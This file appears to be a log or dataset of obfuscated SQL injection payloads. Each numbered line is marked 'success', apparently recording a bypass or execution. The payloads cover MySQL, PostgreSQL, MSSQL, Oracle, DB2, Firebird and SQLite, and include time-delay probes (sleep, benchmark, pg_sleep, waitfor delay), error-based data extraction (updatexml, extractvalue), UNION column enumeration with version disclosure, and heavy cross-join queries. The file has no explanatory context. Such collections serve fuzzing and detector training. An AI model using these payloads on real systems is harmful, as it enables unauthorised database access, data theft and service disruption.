777 success '(SELECT 1)  )   WherE/**/4730<>4731 OR 0 Or 7843 like 7844 '
780 success 'IF  (  0x788  =  4811  )   SELEcT 1928 eLse DROP function ucko-- p'
781 success ' (  sELECt   (  CasE whEN   (  4108   liKe   4108 OR 0 AND True  )   Then 1 eLSe 4108*  (  seLECT 4108 from information_schema.character_sets  )  \neND   )    )  '
782 success "waitfor delay/**/'(SELECT\x0c0):0:5' anD \t (  1098 in\t(1097,1098,1099)  AnD  0x1 "
788 success 'selECT/**/*\xa0frOM users WHerE id   liKe  \n(SELECT 1) + $+%1 Or 0x16d6 LikE (SElECt 5846) -- 0x1 '
790 success '1 aND 0x196e   lIKe \x0b/**//**/ (  select count  (  * /**/)   FrOM sysusers as sys1,sysusers as sys2,sysusers aS sys3,sysusers aS sys4,sysusers as sys5,sysusers as sys6,sysusers As sys7  )  -- ixlk '
793 success "0x1%'   )    )    and 3824  =  benchmark  (  0x4c4b40,md5  (  0x76555642   )    )    and    (    ( /**/ '%' \t=  ' "
794 success "1'/**/  )    )     )   rlike   (  select   (  case when   (  0x16df  =  7142  )   then 1 else 0x28 end \t )    )    and    (    (   /**/ (  'fkhd'  =  'fkhd "
796 success ' SElect * fRom users whERE id \x0b=  (sELeCt 1) oR ";[" OR/**/\'i\'<>\'is\' -- 1 '
800 success "0x1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and  \x0c(  'ireg' like 'ireg "
801 success "0x1'  )   ||   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71, \xa0(  select   (  elt  (  8113  =  8113 AND 4227 NOT LIKE 0x1084,(SELECT 1)   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )   \t )   "
802 success '1/**/where 2301  =/*tVO<*/ 2301 '
803 success '(SELECT/**/1)"  )   or updatexml  (  1808,concat  (/**/ 0x2e,0x7171706a71,  ( /**/select   (  elt  (  1808  =  1808 AND True AND 6362 IN (6361,6362,6363) OR 1557!=(SELECT 1557) OR \'hM\'=\'hMa\',(SELECT 1)   )    )  /*~M*/\x0c )\x0b ,0x717a767a71  )  ,8666  )   and   (  "igop"  =  "igop '
804 success 'SELEcT likE  (  \'abcdefg\',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    ANd "ejmj" LIKe "ejmj '
805 success "0x1,exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  5648=5648 AND '9y\n-'!='9y\n-@',1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    "
806 success 'SelECt count  (/**/ *  )   FrOm sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- '
807 success "-0x646'||  (\x0b select\n'qbaa' wherE 0x1c7e like 7294 And True union all seLEct 3967,3967,3967,0xf7f,3967--/**/"
808 success "(SELECT 0x1)  )   and make_set  (  8403  =  8403 OR 'cz|Q~' NOT LIKE 'cz|Q~',0x22c3  )   "
812 success '0x1%" or   (  select * from   (  select  (  sleep  (  0x5   )    )/**/   \xa0)  ydpu  )   and "%"  =  " '
813 success "0x1'||  (  select 'xbwg' where 'd#' NOT LIKE\n'd#X' OR 'H'!='H' union/**/all SELect null,null,null,null,null,null-- "
817 success "0x1' in boolean mode  ) \t\tunion all/*D-*/SELecT null,null,null,null,null--\tE"
818 success "0x1 and/**/elt  (  1656 LIKE 1656 OR '*P'<>'*P',sleep  (  5   )    )   # macc "
819 success '0x1%"  )   union all SelECt null,null,null,null,null,null,null,null,null,null--\n'
821 success "0x1%'  )   and (SELECT 6414)  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  ' "
823 success ' seleCT * FRom users WhErE id  \nLIKE   (seLECt 1) oR @#",   LIke   (SelECt 1) union sELeCt/**/1,version  (    )   -- 1 '
825 success '0x1%"  )   || 0x3fe   Like     (  sEleCT count  (  *  )   frOM all_users t1,all_users t2,all_users\x0ct3,all_users t4,all_users t5  ) /**/-- '
827 success '0x1"  )   aS tnux WHERe 8181<>(SELect 8182) oR 0 or\t\'B\r\'!=\'B\r\' rlike   (  selECT * FRoM   (  sELECT  (  sleep  (  5   )   \x0c)     )  vwyq  )  # jJ'
829 success 'seLeCT cAsE wHEN 0xa27  =  0x1b7b then (selEcT 1)/**/ELSE null enD--\n'
830 success "SelecT count  (  *  )   FrOM domain.domains as t1,domain.columns As t2,domain.tables as t3 aNd    (    (   'zaru'   lIKe   'zaru "
833 success '(SELECT (SELECT 1))"   )    )    union all select null,null,null,null,null,null# '
834 success '(sELeCt 0x1)" wHere 6493<>6494 Or 0 Or 0 && (SElEcT 2823)  =  5100#/**/uN'
835 success '0x1%"  )   and 8594   LIKE     (  select 8594 from pg_sleep  (  5   )    )   -- '
837 success '0x1 aND   (  sEleCt 2*  (  IF   (  \x0b (   SEleCT * FroM   (  SElEcT concat  (  0x7171706a71,  (  SELeCt   (  elt  (  3484  =  (SEleCT 3484),1 /**/ )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )   /**/)     )  # couj '
838 success ' SEleCt * FroM\x0busers WhEre/**/id  =  1 oR @#"{  =  1 OR \'(%\'=\'(%\' -- 1 t'
839 success '0x1  /**/)    )  /**/  ) /**/ OR sleep  (  5\x0b )  #\t5*'
840 success ' select * from users where id  \x0bLIKE   0x1. union select null,version  (    ) /**/ -- (SELECT (SELECT (SELECT 1))) s'
842 success '-(SELECT 5637)%"   )    )     )   or 8126<>8127 and    (    (     (  "%" /**/=  " '
843 success "-5379'\xa0 )\n  union all select 4294,4294,4294-- "
846 success "(SelECt 1)'+  (  select 'sacd' WHErE 5984/**/  lIke   5984 union all sELECT null,null,null,null,null,null,null# "
847 success '(sELEcT 0x1)"   )    )     )   OR 0x1cf9   LIke     (  SElEcT count  (  *  )   fROm sysibm.systables as t1,sysibm.systables aS t2,sysibm.systables As\tt3  )  -- 93'
848 success "-0xb60'/*d/*/  )    )  \t order by 1-- "
850 success "(SELECT (SELECT 1))'  ) \x0b/**/and elt  (/**/ 0x1099   like   (SELECT 4249),7259  )   "
851 success "(SELect 0x1)' wHeRe 1045 /**/ lIke   (seLeCT 1045) Or (SELecT (SELECT 6793))   like     (  seleCT 6793\tfRoM pg_sleep  (  5   )    )   -- "
852 success 'seLEcT count  (  *  )   fRoM rdb$fields AS t1,rdb$types aS t2,rdb$collations aS t3,rdb$functions As t4 &&    (    (     (\xa0\x0c"dskh"  =  "dskh '
854 success "0x1'||  (  select 'kyhs' from dual where 9491/**/ =  9491 OR 'LE8('!='LE8(' && 1 "
855 success 'SeLECt count \xa0(  *  )   froM sysibm.systables as t1,sysibm.systables aS t2,sysibm.systables As t3 aNd    (    (   "%" \n=  " '
856 success '(SELECT 0x1)"  )   or sleep/**/ (  (SELECT 5)  )   and   (  "fiag" like "fiag '
862 success "(SElEct (SELECT 1))'  )   rlike  \t(  SelECt * froM   (  SeLecT  (  sleep  (  5   )    )     )  sgvo  )  "
863 success ' seLeCt * FRom users WhERE id   LiKe   (Select 1) *\\. union SelECt/**/null,@@VERSION -- 1 '
864 success '0x1%"  )   union all select null,null,null,null,null,null,null,null,null-- '
865 success ' select * from users/**/where id /*[\\:*/=  1 or 1#"? union select \'a\',version  (    )   -- 0x1 '
867 success "(SELECT 0x1)  )   where 'JZ' NOT LIKE 'JZx' OR (SELECT (SELECT 0x1cf9))   LIKE     ( /*u#FuH*/select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- "
869 success '-5539"  )   union all sElEct (SELECT 6189),6189,6189,6189,6189,6189,6189,6189,6189-- C'
870 success 'seLect count  (  *  )   frOM sysibm.systables as t1,sysibm.systables AS t2,sysibm.systables aS t3 &&   (  "lsvg" lIKE "lsvg '
874 success '0x1%"  )   and sleep  (  0x5 \xa0)   and   (  "%"  =  " '
877 success "(SELECT 0x1)'   )    )    rlike   (\x0c select   (  case when   (  3876/*UYb*/ =  2077  ) /*CM*/ then 1 else 0x28 end   )    )    and  \n (    (   'hqcz' like 'hqcz "
878 success '0x1" rlike sleep  (  0x5  )   and "rylv" like "rylv '
879 success "0x1'+  (  select 'mdxt' WHeRE 2733  =  2733 || 4240  = \x0b  (  seLEct 4240 fROm pg_sleep  (  5   )    )   -- "
882 success "(SELECT 0x1)' \t) /*yc*//**/union/**/all SeLeCt\tnull-- "
883 success "(SELECT 1)  )   aS tbve/**/WHeRe 9695 LIKE 9695 AND 'L\r'!='L\r7' AnD 1 "
884 success "0x1' In boolean mode  )   && 0x954 /*qiz*/ LIKe   benchmark  ( /**/5000000,md5  (  0x6d457153   ) /**/  )\x0b  # "
887 success 'call regexp_substring  (  repeat/**/ (  LEfT  (  crypt_key  (  char  (  65/**/ )/**/  Or char/**/ (  (sELeCt 0x45) /**/)  ||char  (  83  )  ,null  )  ,0  ) /**/,500000000  )  ,null  )  # T'
888 success 'selECt   (  CASe wHEn   (  8978  =  1426  )   tHeN 1 eLse 8978*  (  SELECt/*ybit*/8978 FROM master..sysdatabases \n)   eND  )  -- Q'
889 success '0x1   )    )    as gxvp WhERe 0xf19/**/  lIkE   3865 '
891 success " (  sELecT * FRoM   (  SelECt  (  sleep  (  5   )  /**/ )\x0c    )  srmq  )   aND 'fdgq'  =  'fdgq "
897 success ' sEleCT * FRom users/**/WhERe id   LIKE   (SElect 1) +\\. union selecT null,@@VERSION -- 1 '
899 success "(SELECT 1) WhEre 7906   LIKE   7906 and '\x0b'!='\xa01' OR 8156  =    (  SELeCt count  (  *  )   fRom generate_series  (  1,5000000   )    )   -- v="
900 success '-9265"  )/*S:,G*/  or\n7834   like   1685 '
901 success "0x1'+  (/**/ select 'xqjx' where 7048  =  7048 and 9198  =  9198-- "
902 success '-0x2683"   )\t   )     )/**/  union all SELeCT 6595,6595,6595,6595,6595,6595,0x19c3# D&'
903 success 'SEleCt   (  caSE WhEN   (  3537  =  0x1462 \n)   THEN 3537 elSE 3537*  (  SElEct 3537 fRom mysql.db  )   eNd  )  # '
904 success "0x1  )   aS tgqd WHere 8898<>8899 OR False OR 'z '!='z ' ANd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )/**/ ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selECt   (  caSE whEn   (  0x17a7  =  6055  )   tHen 1 ElSE 0 eNd  )   fRoM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )   or chr  (  122  )  ||chr  (  113   )    )     )  -- "
905 success "-(SELECT 8028)%'   )    )     )   or 5042   like   0x145e "
907 success '0x1"  )   As uyns WHERe/**/4751   likE   4751 oR 9284 NOT LIKE 9284 aND   (  SeLEcT * fRom   (  SEleCt  (  sleep  (  (sELECT 0x5)   )    )     )  fzno  )  -- 8D% o'
910 success "0x1'   )    )    as iuta where 'n' NOT LIKE 'nc' "
911 success '  (  sEleCt count  (  *  )/**/  frOM sysibm.systables aS t1,sysibm.systables AS t2,sysibm.systables AS t3  )   '
913 success 'OR 1 iN   (  sELECT @@version  )  -- '
914 success 'SeleCT CAse When 7634   lIke   3954 tHen 1 Else null END-- '
915 success "0x1  )   && extractvalue  (  7982,concat  (  0x5c,0x7171706a71, /**/(  SEleCT   (  elt  (  'F' NOT LIKE 'Fd',0x1   )    )     )  ,0x717a767a71   )    )    "
916 success "0x1'  )   wHErE 'R['='R[' aND 9254   LIkE     (  sELEct count  (  *  )   FRoM rdb$fields AS t1,rdb$types\x0baS t2,rdb$collations As t3,rdb$functions As t4  )  -- k8l'ms"
917 success ' select * from/**/users where id   LIKE   1.<1# union select 1,version  (    )   -- 1 '
918 success '  (  SeLecT * FRoM  /**/(  SeleCT  (  sleep  (  0x5   )    ) /**/   )  srmq  )   ANd   \xa0(\n   (  /**/  (  "sxih"   lIkE   "sxih '
921 success '(selecT 1) /**/) /**/ WHerE\x0b7026   LIKE   7026 && 5263 like 5263 '
923 success 'seleCT count  (  *  )   FrOm rdb$fields as t1,rdb$types aS t2,rdb$collations As t3,rdb$functions aS t4 aND   (  1473/**/ =  1473 '
925 success '(SELeCT (SELECT 1))   )  \t )    aND sleep  (  5  )/**/  aND    (    (   0x237c\x0b  like   0x237c '
926 success '0x1\n  )    )    as sfan whErE 7176  =  7176 And 2540<>2541 and 0xf1!=242 anD 0x1b69   lIke   7358 '
928 success "(SELECT 0x1)' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  0x5   )    )     )  sddo  )  # "
929 success "0x1'||  (  select 'ymez' from dual where 'NX''/**/like 'NX'' Or 0 Or 0x1cf9   LIkE  /*ys*/ \x0c(  seLeCt count  (  *  )   fROm sysibm.systables as\xa0t1,sysibm.systables AS t2,sysibm.systables as t3  )  -- GG"
930 success '(SELECT (SELECT 1))  )   as ewnv where 0xd41  =  3393 OR 8716=8717 and (SELECT 2716)   LIKE   \n (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  -- N<'
931 success '0x1"   )   \x0b)    as knyf where \'Ro8\'=\'Ro8\' or 8384  =  LIKE  (  \'abcdefg\',upper  ( \x0chex  (  randomblob  (  500000000/2   )    )      )    )   -- '
932 success '0x1\xa0wHeRe 2382  =  2382 '
938 success '0x1  ) \x0c WheRe 4349 IN (4348,4349,4350) '
941 success 'SEleCt dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  (SelECT/**/101)  )  ,5  )   frOM dual And    (  \xa0 (   "gydr" liKe "gydr '
942 success "seLECT count  (  */**/ )  /*,k?PV*/froM generate_series \t(  1,5000000  )   and\t'roca'  =  'roca "
946 success "-6030%'  )  /**/or 1829<>1830 OR 0 "
947 success '(SELECT 0x1)"  )  \x0bas dgzf where 4834  =  4834 AND 1 AND \'K/A\' NOT LIKE \'K/A;\' '
948 success "0x1' AND '~#' LIKE '~#'-- "
951 success "0x1'+  (  select 'drvv' whEre 5622  =  5622 And 3580   LIkE     (  selEct count  (  *  )   fRoM domain.domains As t1,domain.columns As t2,domain.tables AS t3  )  -- "
952 success 'seLECt\xa0count  (  *  )   fROm domain.domains AS t1,domain.columns As t2,domain.tables\x0cAs t3  aND  "%"  =  " '
953 success "waitfor delay '0:0:5'/**/"
955 success ' SeleCt *\x0cFrom users WhERE id  =  1 Or @#";  =  1 || 9486!=9487 -- 1 '
957 success "0x1'   )/*wS\n~*/   )  /**/ and   (  select (SELECT 2)*  (  if   (    ( \t select * from /**/ (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484 AND (SELECT/**/1),0x1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'bgdp'  =  'bgdp "
958 success "0x1'+  (  select 'ngdk' where 3169<>3170 OR 'o'!='o' and 3202 \n=  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +' "
960 success "hi' or (SELECT 0x1)  = /**/1 -- "
961 success "(SElect 1)'/**/  )    )    aS bwjl WHere 8538 /*>*/ LiKe   8538 union all selEct null,null,null,null,null,null,null# "
962 success "0x1   )    )   /**/ )   or 5286   like     (  SElECT count  (  *  )   fRoM all_users t1,all_users t2,all_users t3,all_users/**/t4,all_users t5  )   And    (    (     (  '\tt' NOT LIKE '\ttE' || 5716<>5716 "
964 success "1'+  (  sElecT rdwb WHeRE 5757=5757 aND 0xd65  =  7639-- ,"
965 success "0x1'||  (  select 'bsbv' from dual where (SELECT (SELECT 5276))  =  (SELECT (SELECT 5276)) OR 'j'='j?' or   (  select * from   (  select  ( \nsleep  (  5   )    )     )  ydpu   )    )   ||' "
966 success "a'\x0c-- "
967 success "1'+  (  select 'vtyw' WHErE '\\!' LIKE '\\!' || False/*OmG1!*/order by 0x1-- "
970 success 'SElECt   (  cAsE WHEn   (  6166  =  3364  )   thEn 6166 ElsE cast  (  1 As int  )  /  (  SeLEct 0 frOm dual /*\x0c\\-*/)   end  )   fROm dual-- twr'
975 success 'seleCt   (  CasE WHEN   (  8331   LiKe   5625  )   THen 8331 ELsE 8331*  (  sELECt 8331 FrOM mysql.db  )   eND  )  # '
977 success '1/**/and sleep  (\x0c 5  )  # \n*a'
979 success 'select pg_sleep  (  0x5  )   AND "zhsc"  =  "zhsc '
980 success 'seLEcT benchmark/**/ (  5000000,md5  (  0x4c4d6142   )    )   #\xa0idxq '
981 success '0x1"   )    )    and   (  (SELECT 3020)  =  3020 AND 0xe2d NOT LIKE 3630 AND True  )  *0x1a2f and    (    (   "bely"  =  "bely '
982 success '(SeLECT/**/1)"  )   and/**/8514  =    (  select count /**/(  *  )\n  from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  "fpqh"  =  "fpqh '
987 success '(SELECT (SELECT\t0x1))" union all select null,null,null,null,null,null,null,null,null,null#\n@I'
988 success 'Select   (/**/ casE WHeN   (  9030  =  9185  )   tHeN 9030 ELse 9030*  (  SELECT 9030 FrOM information_schema.character_sets  )   EnD  )  # r'
989 success '0x1" and (SELECT 3824)  =  benchmark  (  (SELECT 5000000),md5  (  0x76555642 \x0b )    ) /**//**/ and "tqbi"  =  "tqbi '
991 success "(SELECT (SELECT 1))' /*D`*/ )    )  \x0b  )   union all sElEct null,null,null,null,null,null,null# F"
992 success "-0xb35'\n  )    )    union all SELEct 0xc90-- "
993 success "(SEleCt 0x1)'  )/**/  wHErE 0x240c IN\xa0(9227,9228,9229) OR '!' NOT LIKE '!' "
994 success "0x1'+  (  select zmbu where 6181<>6182 OR '8V>'!='8V>' OR 6535 LIKE (SELECT 6536) rlike   (  select   (  case when   (  '?'<>'?d'  )   then 0x1 else 0x28 end   )    )     )  +' "
995 success "(SELECT (SELECT 1))'  ) \x0c WHERe 1115   LIkE /**//**/0x45b "
998 success '(SELECT 1)" WhEre 507=507 OR False AND True And char  (  120  )  ||char  (  106  )  ||char  (  117  )   OR char  (  85\n/*|c*/)   /**/=  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  -- s'
1000 success "1/**/where 'n0' LIKE 'n0' "
1001 success "0x1   )    )     )   aND \xa0 (  SElect 2*  (  IF   (    (   sElEct * FrOM   (  Select concat  (  0x7171706a71,  (  SelECt   (  elt  (  '+' NOT LIKE '+\\' OR 0 AND True,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 0x7538dcfb7617fffa, 8446744073709551610   ) /**/  )     )   anD    (    (  \t  (  9401  =  9401 AND '\x0b'!='\x0bm' "
1004 success "(SELECT 0x1)%'   )    )    or\x0b0x1a89  =    (  select 0x1a89 from pg_sleep  (  0x5   )    )    and/**/   (    (   '%'  =  ' "
1005 success "end and    (    (     (  'xzbk'   LIKE   'xzbk "
1009 success '"  )   oR benchmark/**/ (  (sELECT 10000000),MD5  (  1   )    )   # '
1010 success "(SEleCT 0x1)'||  (  select 'epjr' fRoM dual WHErE 3074   like   3074 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  ( /*%SNw0*/5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  # \\"
1014 success '(SELECT (SELECT 1))"/**/or 0x2112  =  benchmark/**/ (/**/ 0x4c4b40,md5  (  0x694a4745 \n )    )    '
1015 success '(SELECT 1)  )   WHeRE 6177 In (0x1820,6177,6178) AnD 1 OR 4915   LIKE /*Ae*/   (  sElect count  (  *  )   FROM domain.domains As t1,domain.columns As t2,domain.tables as t3  )  -- '
1018 success "-(sElEcT 0x669)'/**/union all seLect 4835# "
1019 success "-(SELECT 9429)' /**/)/**/ \norder by 1-- "
1024 success "select count/**/ (  *  )   from sysibm.systables as t1,sysibm.systables\nas t2,sysibm.systables as t3 AND   \n(    (   'ootz' like 'ootz "
1026 success '0x1 aND char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0x0  )  ,5000000000  )  ,null\x0b )   '
1027 success '0x1" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  0x70  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386 OR 0  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  0x7a  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and "arqb" like "arqb '
1028 success 'seLEct   (  CASE WHen   (  9246   likE   6326  )   tHen 9246 ElsE 9246*  (  seLect 9246 FRoM mysql.db  )   END  )  # '
1029 success ' (  SEleCt char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sElecT   (  caSe wHeN   (  1931  =  1931  )   Then char  (  49  )   ELSe char  (  48  )   EnD  \t)    )   +char  (  113  )  +char  (  122  )  +char/*Zv8o*/ (  118  )  +char  (  122  )  +char  (  113   )    )  '
1030 success "0x1'  )   where 7587   like   7587 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )  /**/-- Bm"
1031 success "sELeCT pg_sleep  (  5  )   AND '%'   LIKE   ' "
1035 success "0x1'   ) /**/  )    as jtmf where '%' NOT LIKE '%[' "
1038 success "1'\t )   aNd (SELECT 2006)/**/ =  2006 AND '*'='*'/*y*k*/"
1039 success "SeLeCt count  ( /**/*  )   fRoM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5\n )  +' "
1041 success 'select/*G;TK*/  (  case when/**/  (  4780   like   4432  )   then (SELECT 4780) else 4780*  (  select 4780 from mysql.db  ) \t end  )  # Gp'
1043 success "1'\x0brlike sleep/**/ (  5  )  "
1044 success 'SElECt   (  CaSe wHEn   (  7822  =  4430  )   THeN 7822 elSE 1/  (  SELEcT 0  )   eND  )  -- '
1047 success '1/*GKn*/ ) \n where 6090  =  6090 '
1048 success 'SeleCt count  ( \x0b* /**/)   fRoM rdb$fields aS t1,rdb$types aS t2,rdb$collations AS t3,rdb$functions aS t4 aNd    (    (   6977  =  6977 '
1049 success "  ) \x0b Or sleep  (  __TIME__  )     like   '/*\\*/"
1052 success "0x1'   )    )    or 0x20e5  =    (  select count  (  *  )   from generate_series  (  1,0x4c4b40   )    )  \n and    (    ( /**/ 'lqpd'  =  'lqpd "
1053 success " sElECT * frOM users WherE\x0bid   lIKE   '(SELECT (SELECT\xa01))' union selecT \\.#,@@VERSION -- 1' "
1054 success "(sELeCt 0x1)'  )   As noqp Where 4042   LIkE   4042 Or (SELECT 8315)/**/ =    (  SelECT count  (  *  )   frOm sysibm.systables AS t1,sysibm.systables as t2,sysibm.systables AS t3  )  -- "
1056 success 'select case when 0x2023 \t LIKE   0x4cd then 0x1 else null\x0bend-- '
1057 success '(SELECT 0x1)%"   )    )     )   union all select/*H*/null,null,null,null,null,null,null# \tM'
1058 success '(SELECT 0x1)"  )   WherE \'l\' like \'l\'/**/oR False '
1059 success "1'\n )  /**/where\x0c8822 LIKE 8822 OR 0 and make_set  (  8978  =  8594,8594  )  -- 9N"
1060 success " sEleCt *\x0cFrOM users WhERE id   liKe   '1' OR ||/1  =  (seleCt 1) union sElEct 1,version  (    )   -- 1' "
1061 success "(SELECT/**/1)'|| \x0b(  select\x0c'brsr' wherE 957 LIKE 957 AND True\n"
1062 success '(SELECT 0x1)"   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  \'I.\'!=\'I.:\',1   )    )  \x0b  )  ,0x717a767a71   )    )    and    (    (   "gcyp" like "gcyp '
1063 success 'SeleCt * FROm users wHERe id   like   1 <@. or 1  =  (SEleCT 1)\t-- 1 oh'
1065 success "0x1'||  (  select 'iwlj' where 7893 NOT LIKE 7894 AND True and   (  select 9067 from  (  select/*t(|!+*/count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6083 IN (6082,6083,6084),1   )    )   \n )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||' "
1066 success "(sElecT 0x1)'  /**/)    )    union\tall sElEcT null,null,null,null,null-- "
1067 success '-5322"/**/union/**/all sELeCt 6494,6494,6494,6494,6494,6494-- w/**/'
1072 success '0x1"  )   wHeRE 0x1d7c   LIKE   7548\nanD \', \'<>\', G\'\x0c'
1073 success "-1587'\t )   or 8339  =  5540 "
1075 success "(sEleCt 1)'+  (  select 'hjku'\x0cwhere 7640=(SELECT 7640) and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   +' "
1076 success "call/**/regexp_substring  (  repeat  (  lEfT  (  crypt_key  (  char  (  (SELECT 65)  )  ||char  (  0x45  )\x0c ||char  (  (sELECT 83)  )  ,null  )  ,0  )  ,500000000  )  ,null  )   &&    (    (   'tpih'  =  'tpih "
1078 success "(SeLecT 0x1)/**/\x0c)/*A[*/ \x0cwheRE 'I%'!='I%f' "
1080 success " OR '0x1'   =   '1 "
1081 success "-(SELECT 4032)'  )   where 5157 /**/=  5157 OR 0 AND 1590 LIKE (SELECT 1590)\nAND '1' LIKE '1' or 1809  =  2810# "
1082 success "0x1' \x0b)   ANd updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  selEcT   (  elt  (  3393   Like   0xd41,0x1   )    )     )  ,0x717a767a71  )  ,(SELECT 1161)  )   "
1084 success "0x1%'  )   union all select/**/null,null,null,null-- "
1086 success "1'/**/  )    )     )   or char  (  0x75  )  ||char  (  (SELECT 111)  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  0x53  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'akyc'  =  'akyc "
1090 success '0x1  )   aND char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  lefT  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   '
1091 success "1'+  ( /**/select 'dhcv' where 9372  =  9372 AND True OR '\x0c,' LIKE '\x0c,(' "
1092 success '(SELECT 1)" &&   (/**/ select * from   (/**/ select  (  sleep  (  5   )    ) \x0c  \xa0)  gcrr  )  # iy'
1093 success '0x1%"   )    )    order by 1# _'
1095 success '0x1"  )   where 8878  =  8878 AND \'\'\'<>\'\'g\' OR \'"u\' NOT LIKE \'"u\' Or   (  SelEct 9173 FROM  (  SELeCT count  (  *  )  ,concat  (  0x7171706a71,  (  SeLeCt   (  elt  (\t 6579=6579,1   )    )     )  ,0x717a767a71,floor  (  rand  (  (SELECT 0)  )  *2   )    )   x FRoM information_schema.character_sets group by x  )  a  )  -- '
1099 success "0x1%' or 2633  =  dbms_pipe.receive_message  (  chr  (  (SELECT 112)  )  ||chr  (  65  )  ||chr  (  0x41  )  ||chr  (  103  )  ,5  )   and '%'  =  ' "
1103 success "sELECt * FrOm users wHEre id  =  0x1 +   (/**/\t$+  )   oR '.'!='.s' -- 1 "
1106 success "1'/**/ )   or 2633  =  dbms_pipe.receive_message  (  chr\t (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'cysu' like 'cysu "
1110 success 'sELEct   (  CASE WHen   (  7163  =  1777  )   thEn 1 elSe 7163*  (  seleCt 0x1bfb frOM master..sysdatabases  )   END  )  -- j*te'
1112 success '0x1   )    )    AS qsos/**/wHeRE 2721   lIKE \xa0 2721 OR False aNd True rlike   (  SelECT * From   (  SeLECT  (  sleep  (  5   )    )     )  sgvo  )  -- FW'
1120 success '-6263%"/*x9J*/  )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  (SELECT 113)  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  || \xa0(  select   (  case when   (  \'d\' NOT LIKE \'d/\'  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   "%"  =  " '
1122 success "select count /*nn*/(  *  )   from generate_series  (  1,(SELECT 5000000)  )   and    (    (   'hxcq'  =  'hxcq "
1124 success 'SELECT cASE wHeN 2930   lIkE   7964 thEn\x0b(SeLEct 0x1) elSe\tnull eND-- '
1125 success '(SELECT 1) AnD 0x15b4   LIKE     (  SEleCT count  (\x0c *  )   FROm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- gynj k'
1126 success 'seLEcT   (  cAse wHEN   (  5740   LIKE   7636  )   THEn 5740 eLSe cast  (  1 As int  )  /  (  SELect 0x0 from dual  )   ENd  )   from dual-- '
1127 success "0x1%'/**/ )   union/**/all/**/select null,null,null,null,null,null,null,null,null#\np-"
1130 success '0x1"   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  "gimc" like "gimc '
1131 success '0x1"  )   and 6240  =   \n(  \'qqpjq\'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||\'qzvzq\'  )   and   (  "liar"  =  "liar '
1132 success "0x1'+  (  select 'zohk' where 0x157e  =\x0c 5502 || 0x93f\x0b =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --/**/"
1133 success '(Select (SELECT 1))"  )   wHerE 0x14ee  =  5358 '
1134 success "-2190' /**/)   where 0x22ba  =  0x22ba union all select\x0c0x22ba,8890# ED@(KO"
1136 success '(SELECT 0x1)%" and 0x190e/*@EB*/ =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and "%"  =  " '
